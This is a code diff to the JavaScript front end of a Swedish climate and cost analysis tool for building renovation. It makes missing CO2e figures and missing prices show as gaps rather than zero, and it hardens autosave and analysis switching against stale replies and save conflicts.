@@ -4260,10 +4437,11 @@ async function runAlternativesForComponents(componentIds, userFeedback, reason, 
     addMsg('Alternativ uppdaterade' + (isFull ? '' : ' för ' + componentIds.join(', ')) + '.', 'system');
     notifyStepDone('alternatives_rerun', true, isFull ? null : componentIds.join(', '));
   } catch (e) {
+    if (lateReply(epoch)) return;
     addMsg('Fel vid alternativsökning: ' + e.message, 'system');
     notifyStepDone('alternatives_rerun', false);
   } finally {
-    if (!orchestrated) setLoading(false);
+    if (!orchestrated && epoch === analysisEpoch) setLoading(false);
   }
 }
 
@@ -5014,10 +5192,12 @@ async function sendMutation(tool, input) {
       try {
         await processPendingActions(pending);
       } finally {
-        setLoading(false);
+        // After a switch the indicator belongs to the analysis on screen.
+        if (epoch === analysisEpoch) setLoading(false);
       }
     }
   } catch (e) {
+    if (lateReply(epoch)) return;
     addMsg('Ändringen gick inte igenom: ' + e.message, 'system');
     refreshResults();
   } finally {
@@ -5124,8 +5304,13 @@ function effectiveState(st) {
 // figure survives a rerun, so the raw response is no longer what anyone sees.
 function baselineDoneMsg() {
   const shown = effectiveState(state).baseline.components;
-  const total = shown.reduce((s,c) => s + c.co2e_kg, 0);
-  return 'Baslinje klar: **' + Math.round(total).toLocaleString('sv')
+  const co2 = co2Rollup(shown);
+  if (co2.missing.length) {
+    return 'Baslinje klar: **' + Math.round(co2.total).toLocaleString('sv') + ' kg CO₂e** för '
+      + (shown.length - co2.missing.length) + ' av ' + shown.length + ' komponenter. Saknar klimatvärde: '
+      + co2.missing.join(', ') + '.';
+  }
+  return 'Baslinje klar: **' + Math.round(co2.total).toLocaleString('sv')
     + ' kg CO₂e** totalt för ' + shown.length + ' komponenter.';
 }
 
@@ -5241,6 +5426,17 @@ function clearOverride() {
 
 // Baseline costs come from the LLM and can be absent. Same rule as everywhere
 // else: an absent price is not zero kronor.
+// The CO2e side of the same rule: a row without a figure is left out of the
+// total and named, never summed as 0 (as in summaryTotals and compute_aggregate).
+function co2Rollup(rows) {
+  const isFig = v => typeof v === 'number' && Number.isFinite(v);
+  const known = rows.filter(c => isFig(c.co2e_kg));
+  return {
+    total: known.reduce((s, c) => s + c.co2e_kg, 0),
+    missing: rows.filter(c => !isFig(c.co2e_kg)).map(c => c.component_name || c.name || ''),
+  };
+}
+
 function knownCostRollup(rows) {
   const priced = rows.filter(c => c.cost_sek > 0);
   return {
@@ -5300,17 +5496,21 @@ function basisLine(c) {
 
 function baslinjeHtml(st, cfg) {
   const d = st.baseline;
-  const total = d.components.reduce((s,c) => s + c.co2e_kg, 0);
+  const co2 = co2Rollup(d.components);
+  const total = co2.total;
   const cost = knownCostRollup(d.components);
   let html = (cfg && cfg.hideTitle) ? '' : '<div class="section-title">Baslinje (NollCO2-metoden)</div>';
   html += '<div class="method-label">Klimatmetod: GWP-fossil, livscykelskedena A1-A3 (Boverkets klimatdatabas)</div>';
   html += '<div class="source-legend"><span><span class="source-badge source-verified">EPD</span> Verifierad k\u00e4lla</span><span><span class="source-badge source-aggregate">EPD-typvärde</span> Kategori-typvärde (övre halvan)</span><span><span class="source-badge source-estimate">Est.</span> Uppskattning</span></div>';
   html += '<div class="summary">';
-  html += '<div class="card"><div class="card-title">Total CO\u2082e</div><div class="value">' + Math.round(total).toLocaleString('sv') + '</div><div class="sublabel">kg CO\u2082e</div></div>';
+  html += '<div class="card"><div class="card-title">Total CO\u2082e</div><div class="value">' + Math.round(total).toLocaleString('sv') + '</div><div class="sublabel">kg CO\u2082e' + (co2.missing.length ? ' för ' + (d.components.length - co2.missing.length) + ' av ' + d.components.length + ' komponenter' : '') + '</div></div>';
   html += '<div class="card"><div class="card-title">' + (cost.unpriced.length ? 'Kostnad (delsumma)' : 'Total kostnad') + '</div><div class="value">' + Math.round(cost.known).toLocaleString('sv') + '</div><div class="sublabel">' + (cost.unpriced.length ? 'SEK för ' + cost.pricedCount + ' av ' + cost.total + ' komponenter' : 'SEK') + '</div></div>';
   html += '<div class="card"><div class="card-title">Komponenter</div><div class="value">' + d.components.length + '</div><div class="sublabel">st</div></div>';
   if (cost.unpriced.length) {
     html += '<div style="grid-column:1/-1;font-size:11px;color:var(--kk-red-orange);margin-top:-4px">Saknar pris: ' + esc(cost.unpriced.join(', ')) + '. Ingen prisuppgift hittades, posten är alltså inte gratis.</div>';
+  }
+  if (co2.missing.length) {
+    html += '<div style="grid-column:1/-1;font-size:11px;color:var(--kk-red-orange);margin-top:-4px">Saknar klimatvärde: ' + esc(co2.missing.join(', ')) + '. Komponenten räknas inte med i summan.</div>';
   }
   html += '</div>';
   html += '<div class="comp-card"><div class="comp-card-header"><h3>Per komponent</h3></div>';
@@ -5338,7 +5538,8 @@ function baslinjeHtml(st, cfg) {
     // An overridden figure is marked in the cell it replaced, not only in the
     // report. Someone reading the sheet has to be able to see which numbers are
     // theirs without opening the document.
-    const co2eCell = overrideEdit(Math.round(c.co2e_kg).toLocaleString('sv'),
+    const co2eCell = overrideEdit((typeof c.co2e_kg === 'number' && Number.isFinite(c.co2e_kg))
+                                    ? Math.round(c.co2e_kg).toLocaleString('sv') : '—',
                                   c.component_id, 'baseline_co2e', c.co2e_override, cfg)
       + overrideBadge(c.co2e_override) + perUnit;
     const costCell = overrideEdit(
@@ -5358,13 +5559,32 @@ function renderBaslinjeContent() {
   document.getElementById('resultContent').innerHTML = baslinjeHtml(effectiveState(state), {editable: true});
 }
 
+// The asking price of one listed article, for a Palats row whose component is
+// counted in m2, lm or kg ("725 kr/st *"), or 0 for every other row. How much of
+// the need an article covers is unknown, so it is not the component's cost and
+// must never be summed or ranked as one. Rows built since 2026-09-30 carry it in
+// article_price_sek with cost_sek 0. Analyses saved before that hold it in
+// cost_sek, recognisable only by the trailing " *" on a Palats row. Twin of
+// aggregate.article_price in Python.
+function articlePrice(alt) {
+  if (!alt) return 0;
+  if (alt.article_price_sek > 0) return alt.article_price_sek;
+  const legacy = alt.article_price_sek === undefined
+    && String(alt.name || '').trim().endsWith('*')
+    && String(alt.source || '').indexOf('[Palats]') === 0;
+  return (legacy && alt.cost_sek > 0) ? alt.cost_sek : 0;
+}
+
 // Climate benefit per krona. Johanna, juni 2026: "Alternativen ska visas med
 // bäst klimatnytta per krona, oavsett återbruk eller nyproducerade alternativ."
 // Henric confirmed the sort key on 2026-06-10: kr per saved kg CO2e, lowest
 // first. Until now the table simply showed whatever order the agent produced.
 function altValue(comp, alt) {
   const saved = comp.baseline_co2e_kg - alt.co2e_kg;
-  const priced = alt.cost_sek > 0;
+  // A per-article price ranked as the floor's cost read "billigare" for 725 kr.
+  // An unpriced baseline is not a free one: the extra cost is unknown, so the
+  // row ranks as unpriced instead of counting its whole price as the extra.
+  const priced = alt.cost_sek > 0 && !(articlePrice(alt) > 0) && comp.baseline_cost_sek > 0;
   const extra = alt.cost_sek - comp.baseline_cost_sek;
   if (!priced) return { tier: 2, value: 0, saved: saved, priced: false };
   if (saved <= 0) return { tier: 3, value: -saved, saved: saved, priced: true };
@@ -5420,6 +5640,9 @@ function priceBasisNote(alt) {
     return '<div style="font-size:10px;color:var(--kk-gray-500)">marknadspris</div>';
   if (alt.price_basis === 'llm_estimate')
     return '<div style="font-size:10px;color:var(--kk-red-orange)" title="Ingen priskälla hittades vid webbsökning. Siffran är språkmodellens egen uppskattning av ett typiskt installerat pris och behöver kontrolleras innan den används som underlag.">AI-uppskattat pris</div>';
+  // An outlier replaced by the category's typical price (review L2).
+  if (alt.price_basis === 'adjusted')
+    return '<div style="font-size:10px;color:var(--kk-red-orange)" title="Priset som hittades låg långt utanför det rimliga för materialet och har ersatts med ett typiskt pris för kategorin. Kontrollera det innan det används som underlag.">justerat schablonpris</div>';
   return '';
 }
 
@@ -5482,7 +5705,9 @@ function alternativHtml(st, cfg) {
       '<td><span class="type-badge type-baseline">Baslinje</span></td>' +
       '<td>' + blMaterialCell + '</td><td style="font-size:11px">' + (blSource.includes('Boverket') ? '<span class="source-badge source-verified">BVK</span>' : (blSource.includes('typvärde') ? '<span class="source-badge source-aggregate">EPD-typvärde</span>' : '<span class="source-badge source-estimate">Est.</span>')) + ' NollCO2</td>' +
       '<td style="text-align:right">' + Math.round(comp.baseline_co2e_kg) + overrideBadge(comp.baseline_co2e_override) + '</td>' +
-      '<td style="text-align:right">' + Math.round(comp.baseline_cost_sek).toLocaleString('sv') + ' kr' + overrideBadge(comp.baseline_cost_override) + '</td>' +
+      // An unpriced baseline is "Pris saknas" here too, not "0 kr": the summary
+      // leaves it out of the cost comparison, and the row must not say otherwise.
+      '<td style="text-align:right">' + formatCost({cost_sek: comp.baseline_cost_sek}) + overrideBadge(comp.baseline_cost_override) + '</td>' +
       '<td style="text-align:right;color:var(--kk-gray-500)">referens</td><td></td></tr>';
     rankedAlternatives(comp).forEach(entry => {
       const alt = entry.alt, i = entry.i;
@@ -5508,10 +5733,13 @@ function alternativHtml(st, cfg) {
       // adjustability yet.
       const showBreakdown = alt.alternative_type === 'reuse' && !alt.name.endsWith('*') && pc && pc.quantity > 0 && alt.cost_sek > 0;
       const perUnit = showBreakdown ? Math.round(alt.cost_sek / pc.quantity) : 0;
-      const costCell = !(alt.cost_sek > 0)
-        ? formatCost(alt)
-        : (alt.name.endsWith('*')
-          ? Math.round(alt.cost_sek).toLocaleString('sv') + ' kr/st *'
+      // The per-article price is shown for what it is, and first: on current
+      // rows cost_sek is 0, so the "Pris saknas" branch would otherwise hide it.
+      const perArticle = articlePrice(alt);
+      const costCell = perArticle > 0
+        ? Math.round(perArticle).toLocaleString('sv') + ' kr/st *'
+        : (!(alt.cost_sek > 0)
+          ? formatCost(alt)
           : (showBreakdown
             ? '<div style="line-height:1.3">' + Math.round(alt.cost_sek).toLocaleString('sv') + ' kr<div style="font-size:10px;color:var(--kk-gray-500)">' + esc(String(pc.quantity)) + ' \u00d7 ' + perUnit.toLocaleString('sv') + ' kr annonspris</div></div>'
             : '<div style="line-height:1.3">' + Math.round(alt.cost_sek).toLocaleString('sv') + ' kr' + priceBasisNote(alt) + '</div>'));
@@ -5785,12 +6013,16 @@ async function runMatch() {
   }
   _matchBusy = true;
   if (hint) { hint.className = 'override-hint'; hint.textContent = 'Söker…'; }
+  const epoch = analysisEpoch;
   try {
     const comp = (followupRows(effectiveState(state)).find(r => r.component_id === _matchOpen)) || {};
     const r = await authFetch('/api/match', {method: 'POST', headers: {'Content-Type': 'application/json'},
       body: JSON.stringify({query: query, component_hint: comp.name || '', limit: 12})});
     const d = await r.json();
     _matchBusy = false;
+    // Hits for a row in the analysis left behind; ids repeat across analyses,
+    // so drawing them here would offer to bind them to the wrong component.
+    if (epoch !== analysisEpoch) return;
     if (d.error) {
       if (hint) { hint.className = 'override-hint bad'; hint.textContent = d.error; }
       return;
@@ -5850,6 +6082,10 @@ function utfallHtml(st, cfg) {
             + fmtNum(t.planned_cost_sek) + ' SEK ('
             + (t.cost_difference_sek > 0 ? '+' : '') + fmtNum(t.cost_difference_sek) + ' SEK), över '
             + t.cost_rows_counted + ' komponenter med verkligt pris.</div>';
+    }
+    if ((t.cost_uncounted_names || []).length) {
+      html += '<div class="method-label">Har verkligt pris men inget planerat, så kostnaden jämförs inte: '
+            + esc(t.cost_uncounted_names.join(', ')) + '.</div>';
     }
   }
   html += '<div class="comp-card"><table class="comp-table"><thead><tr>'
@@ -6499,8 +6735,12 @@ function selectAlt(compId, altIdx, row) {
       // available_quantity and price_basis travel with the selection so the
       // report can state the stock assumption behind a reuse figure. The
       // report is the artifact that leaves the tool, so the caveat has to
-      // reach it, not just the on-screen table.
-      selected_alternative: {name: alt.name, co2e_kg: alt.co2e_kg, cost_sek: alt.cost_sek, source: alt.source,
+      // reach it, not just the on-screen table. A per-article reuse price
+      // travels in its own field, never as the component's cost, also when the
+      // row comes from an analysis saved before 2026-09-30.
+      selected_alternative: {name: alt.name, co2e_kg: alt.co2e_kg,
+        cost_sek: articlePrice(alt) > 0 ? 0 : alt.cost_sek, article_price_sek: articlePrice(alt),
+        source: alt.source,
         available_quantity: (alt.available_quantity === undefined ? null : alt.available_quantity),
         price_basis: alt.price_basis || '', gwp_basis: alt.gwp_basis || ''},
       baseline_co2e_kg: comp.baseline_co2e_kg, baseline_cost_sek: comp.baseline_cost_sek };
@@ -6558,10 +6798,13 @@ function allocatePicks(comp, names, need, requested) {
 // needs to know a combination exists; `picks` carries the parts.
 function combinedSelection(comp, allocs, need) {
   const n = Number(need) || 0;
+  // A part without a climate figure has none to share; 0 would make the
+  // combination read as a real, low total (review of the totals fixes).
+  const hasFigure = v => typeof v === 'number' && Number.isFinite(v);
   const picks = allocs.map(p => ({
     name: p.alt.name,
     quantity: p.quantity,
-    co2e_kg: n > 0 ? p.alt.co2e_kg * p.quantity / n : 0,
+    co2e_kg: !hasFigure(p.alt.co2e_kg) ? null : (n > 0 ? p.alt.co2e_kg * p.quantity / n : 0),
     cost_sek: n > 0 ? p.alt.cost_sek * p.quantity / n : 0,
     source: p.alt.source,
     url: p.alt.url || '',
@@ -6579,7 +6822,7 @@ function combinedSelection(comp, allocs, need) {
   return {id: comp.component_id, name: comp.component_name,
     selected_alternative: {
       name: picks.map(p => p.name + ' × ' + p.quantity).join(' + '),
-      co2e_kg: picks.reduce((s, p) => s + p.co2e_kg, 0),
+      co2e_kg: picks.some(p => p.co2e_kg === null) ? null : picks.reduce((s, p) => s + p.co2e_kg, 0),
       cost_sek: unpriced ? 0 : priced.reduce((s, p) => s + p.cost_sek, 0),
       source: picks.map(p => p.source).join('; '),
       available_quantity: avail,
@@ -6685,23 +6928,45 @@ function setPickQuantity(compId, altIdx, value) {
 // web-priced survives the B1 filter at 0. Adding it as zero kronor understated
 // the basket and produced a saving out of a data gap, so unpriced components are
 // named and the comparison runs over the priced subset only.
-function summaryTotals(sels) {
+//
+// A per-article reuse price ("725 kr/st *") is not a known cost either, and a
+// baseline without a price is the same gap on the other side: until 2026-09-30
+// its 0 entered the comparison and a floor read "↑50% vs baslinje". So the
+// comparison runs over the components priced on BOTH sides. Twin of
+// compute_aggregate in Python.
+function summaryTotals(allSels) {
+  // A selection without a climate figure on either side is left out of every
+  // total and named, as compute_aggregate does: counted as 0 kg it read as the
+  // whole baseline saved, and undefined made the card NaN. Only real numbers
+  // count, as in Python's _number ("ca 400" is not a figure).
+  const isFigure = v => typeof v === 'number' && Number.isFinite(v);
+  const sels = allSels.filter(c => isFigure((c.selected_alternative || {}).co2e_kg)
+    && isFigure(c.baseline_co2e_kg));
+  const noFigure = allSels.filter(c => sels.indexOf(c) < 0).map(c => c.name);
   const totalCo2 = sels.reduce((s,c) => s + c.selected_alternative.co2e_kg, 0);
   const blCo2 = sels.reduce((s,c) => s + c.baseline_co2e_kg, 0);
-  const priced = sels.filter(c => c.selected_alternative.cost_sek > 0);
-  const unpriced = sels.filter(c => !(c.selected_alternative.cost_sek > 0)).map(c => c.name);
-  const knownCost = priced.reduce((s,c) => s + c.selected_alternative.cost_sek, 0);
-  const comparableBl = priced.reduce((s,c) => s + c.baseline_cost_sek, 0);
+  // Costs follow the same rule: "90000" is not a price, and summed it
+  // concatenated.
+  const priceOf = v => isFigure(v) && v > 0;
+  const hasCost = c => priceOf(c.selected_alternative.cost_sek) && !(articlePrice(c.selected_alternative) > 0);
+  const altPriced = sels.filter(hasCost);
+  const unpriced = sels.filter(c => !hasCost(c)).map(c => c.name);
+  const knownCost = altPriced.reduce((s,c) => s + c.selected_alternative.cost_sek, 0);
   // Same rule on the baseline side: a baseline component the model gave no
   // cost for is not a free component.
-  const blPriced = sels.filter(c => c.baseline_cost_sek > 0);
+  const blPriced = sels.filter(c => priceOf(c.baseline_cost_sek));
   const blCost = blPriced.reduce((s,c) => s + c.baseline_cost_sek, 0);
+  const blUnpriced = sels.filter(c => !priceOf(c.baseline_cost_sek)).map(c => c.name);
+  // The pairs a cost difference can be formed for.
+  const priced = altPriced.filter(c => priceOf(c.baseline_cost_sek));
+  const comparableCost = priced.reduce((s,c) => s + c.selected_alternative.cost_sek, 0);
+  const comparableBl = priced.reduce((s,c) => s + c.baseline_cost_sek, 0);
   return {
     totalCo2: totalCo2, blCo2: blCo2, blCost: blCost,
-    blUnpricedCount: sels.length - blPriced.length,
-    knownCost: knownCost, comparableBl: comparableBl,
-    unpriced: unpriced, costIsPartial: unpriced.length > 0,
-    pricedCount: priced.length, total: sels.length,
+    blUnpricedCount: blUnpriced.length, blUnpriced: blUnpriced,
+    knownCost: knownCost, comparableCost: comparableCost, comparableBl: comparableBl,
+    unpriced: unpriced, costIsPartial: unpriced.length > 0 || blUnpriced.length > 0 || noFigure.length > 0,
+    pricedCount: priced.length, total: allSels.length, noFigure: noFigure,
   };
 }
 
@@ -6713,24 +6978,42 @@ function updateSummary() {
   const co2Diff = t.totalCo2 - t.blCo2;
   const co2Pct = t.blCo2 > 0 ? Math.round(Math.abs(co2Diff) / t.blCo2 * 100) : 0;
   const co2Arrow = co2Diff <= 0 ? '\u2193' : '\u2191';
-  const costDiff = t.knownCost - t.comparableBl;
+  // The value and the percentage both cover the components priced on both
+  // sides, so the card never divides one set of components by another.
+  const costDiff = t.comparableCost - t.comparableBl;
   const costPct = t.comparableBl > 0 ? Math.round(Math.abs(costDiff) / t.comparableBl * 100) : 0;
   const costArrow = costDiff <= 0 ? '\u2193' : '\u2191';
   // With a hole in the basket the headline is a part, not a total, and the
   // percentage compares the priced components against their own baseline.
   const costTitle = t.costIsPartial ? 'Kostnad (delsumma)' : 'Kostnad';
-  const costSub = t.costIsPartial
+  // No component priced on both sides: there is no cost to show, and "0" with
+  // "\u21930%" would read as a known cost with no change.
+  const costKnown = t.pricedCount > 0;
+  const costValue = costKnown ? Math.round(t.comparableCost).toLocaleString('sv') : '-';
+  const costSub = !costKnown
+    ? 'Ingen komponent har pris p\u00e5 b\u00e5da sidor'
+    : t.costIsPartial
     ? 'SEK f\u00f6r ' + t.pricedCount + ' av ' + t.total + ' komponenter (' + costArrow + costPct + '% vs deras baslinje)'
     : 'SEK (' + costArrow + costPct + '% vs baslinje)';
-  const costGap = t.costIsPartial
+  const costGap = (t.unpriced.length
     ? '<div style="grid-column:1/-1;font-size:11px;color:var(--kk-red-orange);margin-top:-4px">Saknar pris: '
       + esc(t.unpriced.join(', '))
       + '. Ingen prisuppgift hittades, posten \u00e4r allts\u00e5 inte gratis \u2014 n\u00e5gon totalkostnad g\u00e5r inte att ange.</div>'
-    : '';
+    : '')
+    + (t.blUnpriced.length
+    ? '<div style="grid-column:1/-1;font-size:11px;color:var(--kk-red-orange);margin-top:-4px">Baslinjen saknar pris: '
+      + esc(t.blUnpriced.join(', '))
+      + '. Kostnaden j\u00e4mf\u00f6rs d\u00e4rf\u00f6r bara f\u00f6r komponenter med pris p\u00e5 b\u00e5da sidor.</div>'
+    : '')
+    + (t.noFigure.length
+    ? '<div style="grid-column:1/-1;font-size:11px;color:var(--kk-red-orange);margin-top:-4px">Saknar klimatv\u00e4rde: '
+      + esc(t.noFigure.join(', '))
+      + '. Komponenten r\u00e4knas inte med i summorna. V\u00e4lj alternativet igen.</div>'
+    : '');
   document.getElementById('summaryArea').innerHTML =
     '<div class="summary">' +
     '<div class="card' + (co2Diff <= 0 ? ' saving' : '') + '"><div class="card-title">Klimatp\u00e5verkan</div><div class="value">' + Math.round(t.totalCo2).toLocaleString('sv') + '</div><div class="sublabel">kg CO\u2082e (' + co2Arrow + co2Pct + '% vs baslinje)</div></div>' +
-    '<div class="card' + (!t.costIsPartial && costDiff <= 0 ? ' saving' : '') + '"><div class="card-title">' + costTitle + '</div><div class="value">' + Math.round(t.knownCost).toLocaleString('sv') + '</div><div class="sublabel">' + costSub + '</div></div>' +
+    '<div class="card' + (costKnown && !t.costIsPartial && costDiff <= 0 ? ' saving' : '') + '"><div class="card-title">' + costTitle + '</div><div class="value">' + costValue + '</div><div class="sublabel">' + costSub + '</div></div>' +
     '<div class="card"><div class="card-title">Baslinje</div><div class="value">' + Math.round(t.blCo2).toLocaleString('sv') + '</div><div class="sublabel">kg CO\u2082e | ' + Math.round(t.blCost).toLocaleString('sv') + ' SEK' + (t.blUnpricedCount ? ' (' + t.blUnpricedCount + ' utan pris)' : '') + '</div></div>' +
     costGap +
     '</div>';
@@ -6759,6 +7042,22 @@ let analysisEpoch = 0;
 let isSignup = false;
 let saveTimeout = null;
 let saveInProgress = false;
+// The save in flight, so a switch can wait for it before sending a newer edit.
+let _savePromise = null;
+// updated_at of the row as this window last read or wrote it. Sent with every
+// PUT so the server can refuse a write from a window that has fallen behind.
+let _analysisUpdatedAt = null;
+// A failed save retries once on its own; after that the next edit retries.
+let _saveRetryArmed = false;
+// The reload that follows a save conflict, while it runs. A switch waits for it
+// and then stays, so the notice explaining the reload is read on the analysis it
+// is about (save review F1, 2026-10-01).
+let _conflictReload = null;
+// Bumped by every loadAnalysis and by createNewProject, so of two loads in flight
+// only the one asked for last is drawn. Without it the slower answer won, and a
+// quick second click, or a conflict reload overlapping a switch, left the
+// screen on an analysis the user had already moved away from.
+let _loadSeq = 0;
 
 // Auth-aware fetch wrapper with safe JSON parsing
 async function authFetch(url, options) {
@@ -6788,14 +7087,109 @@ async function authFetch(url, options) {
 }
 
 // No-op when Supabase not configured
+// Every timer that starts autoSave clears saveTimeout when it fires:
+// flushPendingSave and the retry in autoSave both ask "is an edit still
+// waiting?", and a spent handle answered yes.
 function scheduleAutoSave() {
   if (!HAS_SUPABASE || !currentUser) return;
   if (saveTimeout) clearTimeout(saveTimeout);
-  saveTimeout = setTimeout(autoSave, 2000);
+  saveTimeout = setTimeout(() => { saveTimeout = null; return autoSave(); }, 2000);
+}
+
+// Send an edit still waiting in the debounce, to the analysis it was made in.
+// Called before anything that replaces the analysis on screen. A save already
+// running is awaited first: its row then lands under the analysis it came from,
+// and if it fails the user hears it before leaving, not after.
+// Returns false only when there was an edit and it could not be saved. A save
+// that failed earlier (_saveRetryArmed stays set until one succeeds) counts as
+// pending: its edit is still only in this window.
+// 'conflict' when another window had saved this analysis: the reload has then
+// replaced the edit, and the caller should stay to show why. A save that has not
+// answered within SAVE_WAIT_MS counts as failed, so the user is asked rather than
+// left waiting on a switch that never happens; the request itself keeps running
+// and lands in the row it was sent to.
+const SAVE_WAIT_MS = 15000;
+async function flushPendingSave() {
+  if (_conflictReload) return _waitForConflictReload();
+  let pending = !!saveTimeout || _saveRetryArmed;
+  if (!pending && !_savePromise) return true;
+  if (saveTimeout) { clearTimeout(saveTimeout); saveTimeout = null; }
+  if (_savePromise) {
+    let ran = false;
+    try { ran = await _withTimeout(_savePromise, SAVE_WAIT_MS); } catch (e) {}
+    if (ran === 'conflict') return _waitForConflictReload();
+    if (ran === 'timeout') {
+      // An edit was waiting behind the stalled save. Put it back in the
+      // debounce, so staying still saves it once the stalled one lets go;
+      // leaving clears it (leaveCurrentAnalysis).
+      if (pending) scheduleAutoSave();
+      return false;
+    }
+    // An edit made while it ran re-armed the timer; a failure armed the retry.
+    if (saveTimeout) { clearTimeout(saveTimeout); saveTimeout = null; pending = true; }
+    if (ran !== true) pending = true;
+  }
+  if (!pending) return true;
+  const result = await _withTimeout(autoSave(), SAVE_WAIT_MS);
+  if (result === 'conflict') return _waitForConflictReload();
+  return result === true;
+}
+
+// Bounded like the saves: a reload that stalls must not hold every later
+// switch, logout and "Nytt projekt". After SAVE_WAIT_MS the user is asked.
+async function _waitForConflictReload() {
+  const reload = _conflictReload;
+  if (!reload) return 'conflict';
+  return (await _withTimeout(reload, SAVE_WAIT_MS)) === 'timeout' ? false : 'conflict';
+}
+
+// The promise's value, or 'timeout' after ms. The promise itself runs on.
+function _withTimeout(promise, ms) {
+  let timer;
+  const timeout = new Promise(res => { timer = setTimeout(() => res('timeout'), ms); });
+  return Promise.race([promise, timeout]).finally(() => clearTimeout(timer));
+}
+
+// Before replacing the analysis on screen: save what is pending, and if that
+// fails, let the user stay rather than lose the edit without a word.
+async function leaveCurrentAnalysis() {
+  const saved = await flushPendingSave();
+  if (saved === true) return true;
+  // Another window's newer version has just been loaded, with a notice saying
+  // so. Stay, so it is read on the analysis it is about.
+  if (saved === 'conflict') return false;
+  const leave = confirm('Den senaste ändringen i det här projektet kunde inte sparas. Byter du nu försvinner den. Byta ändå?');
+  // Leaving drops the edit, as the question says. Its timer must not fire
+  // later against whatever is on screen then (an emptied new project would
+  // POST as a row of its own).
+  if (leave) {
+    if (saveTimeout) { clearTimeout(saveTimeout); saveTimeout = null; }
+    _saveRetryArmed = false;
+  }
+  return leave;
+}
+
+// Leaving the analysis while a step runs drops that step's answer (lateReply).
+// Ask first, so it is a choice and not a surprise.
+function confirmLeaveDuringRun() {
+  if (!_runInFlight) return true;
+  return confirm('Aida arbetar fortfarande med det här projektet. Byter du nu sparas inte svaret, och du får köra steget igen. Byta ändå?');
+}
+
+// Another window saved this analysis after this one last read it. Its version
+// wins: writing this window's copy over it would silently undo that work.
+// Reload and say so; what was edited here since the last save is what is lost.
+async function handleSaveConflict() {
+  if (saveTimeout) { clearTimeout(saveTimeout); saveTimeout = null; }
+  // Only when the reload drew: a switch or "Nytt projekt" can supersede it.
+  if (!(await loadAnalysis(currentAnalysisId, {force: true}))) return;
+  showNotice('Analysen hade ändrats i ett annat fönster, så den senaste versionen har laddats här. '
+    + 'Det du ändrade i det här fönstret efter förra sparningen kom inte med. Gör om det om det behövs.');
 }
 
 async function autoSave() {
-  if (!supabaseClient || !currentUser) return;
+  // Nothing can be saved without a login, so there is nothing to report either.
+  if (!supabaseClient || !currentUser) return true;
   // A save already running means this call would drop whatever changed since it
   // started. Come back instead of returning: the debounce timer has already
   // fired, so nothing else is going to retry, and the edit disappears with no
@@ -6803,84 +7197,130 @@ async function autoSave() {
   // shows most, because there is no later step that resaves the field.
   if (saveInProgress) {
     if (saveTimeout) clearTimeout(saveTimeout);
-    saveTimeout = setTimeout(autoSave, 500);
+    saveTimeout = setTimeout(() => { saveTimeout = null; return autoSave(); }, 500);
     return;
   }
   saveInProgress = true;
+  let saveDone;
+  _savePromise = new Promise(res => { saveDone = res; });
+  // Read before the first await, like the payload below: a switch while this
+  // save is in flight must not hand its result to the analysis then on screen.
+  const epoch = analysisEpoch;
   const indicator = document.getElementById('saveIndicator');
   // A timer left from the last save must not hide this one.
   if (indicator) { clearTimeout(indicator._hide); indicator.textContent = 'Sparar...'; indicator.style.visibility = 'visible'; indicator.style.color = 'var(--kk-gray-400)'; }
-  // Directives persist per analysis. Until a dedicated column exists, they ride
-  // inside project_data (the server's Project.from_dict ignores unknown keys).
-  // Spread so we never mutate the working state.project object.
-  const projectDataToSave = state.project
-    ? Object.assign({}, state.project, {directives: state.directives,
-                                        selection_intent: state.selectionIntent,
-                                        mode: state.mode,
-                                        overrides: state.overrides})
-    : null;
-  const analysisData = {
-    // Falls back to the property before 'Nytt projekt': someone who names the
-    // building before describing the job has already said something more useful
-    // than the placeholder.
-    name: state.project ? (state.project.name || state.project.building_type || 'Nytt projekt')
-                        : (state.propertyRef || 'Nytt projekt'),
-    status: state.step,
-    project_data: projectDataToSave,
-    baseline_data: state.baseline,
-    alternatives_data: state.alternatives,
-    selections_data: Object.keys(state.selections).length > 0 ? state.selections : null,
-    report_markdown: state.reportMarkdown,
-    // Increment 4: the conversation gets its own column, not a project_data
-    // piggyback like directives — project_data is null until intake succeeds,
-    // and the advisory questions we most want to keep happen before that.
-    conversation_data: (state.conversation && state.conversation.length) ? state.conversation : null,
-    // Own column, like conversation_data and for the same reason: an analysis
-    // opened straight in follow-up mode has no project_data to ride in until
-    // intake has run, and following up a job Aida never calculated is a normal
-    // case, not an edge one.
-    as_built_data: Object.keys(state.as_built || {}).length ? state.as_built : null,
-    // Own column (§14.3), and null when the last file is removed so the row
-    // stops pointing at files that are gone.
-    attachments_data: (state.attachments && state.attachments.length) ? state.attachments : null,
-    // Own column (§13.2), null for an empty sheet so the row carries nothing it
-    // does not need.
-    sheet_data: (state.sheet && state.sheet.blocks && state.sheet.blocks.length) ? state.sheet : null,
-    property_ref: state.propertyRef || null,
-    // The month input gives 'YYYY-MM'; the column is a DATE, so anchor it to the
-    // first of the month. We only ever show the month back, so the day is a
-    // storage detail and never a claim about precision we do not have.
-    planned_start: state.plannedStart ? (state.plannedStart + '-01') : null,
-  };
+  // authFetch turns every non-JSON body into {error}, so a failed save does not
+  // throw: it has to be read off the response, or the indicator says "Sparat"
+  // over a 404, 401 or 500.
+  const failed = (r, result) => !r.ok || !result || result.error;
+  const reason = (r, result) => (result && result.error) || ('HTTP ' + r.status);
+  let ok = false;
+  // The payload is built inside the try: a throw here used to skip the finally,
+  // leave saveInProgress set, and every later save waited on it for good.
   try {
+    // Directives persist per analysis. Until a dedicated column exists, they ride
+    // inside project_data (the server's Project.from_dict ignores unknown keys).
+    // Spread so we never mutate the working state.project object.
+    const projectDataToSave = state.project
+      ? Object.assign({}, state.project, {directives: state.directives,
+                                          selection_intent: state.selectionIntent,
+                                          mode: state.mode,
+                                          overrides: state.overrides})
+      : null;
+    const analysisData = {
+      // Falls back to the property before 'Nytt projekt': someone who names the
+      // building before describing the job has already said something more useful
+      // than the placeholder.
+      name: state.project ? (state.project.name || state.project.building_type || 'Nytt projekt')
+                          : (state.propertyRef || 'Nytt projekt'),
+      status: state.step,
+      project_data: projectDataToSave,
+      baseline_data: state.baseline,
+      alternatives_data: state.alternatives,
+      selections_data: Object.keys(state.selections || {}).length > 0 ? state.selections : null,
+      report_markdown: state.reportMarkdown,
+      // Increment 4: the conversation gets its own column, not a project_data
+      // piggyback like directives — project_data is null until intake succeeds,
+      // and the advisory questions we most want to keep happen before that.
+      conversation_data: (state.conversation && state.conversation.length) ? state.conversation : null,
+      // Own column, like conversation_data and for the same reason: an analysis
+      // opened straight in follow-up mode has no project_data to ride in until
+      // intake has run, and following up a job Aida never calculated is a normal
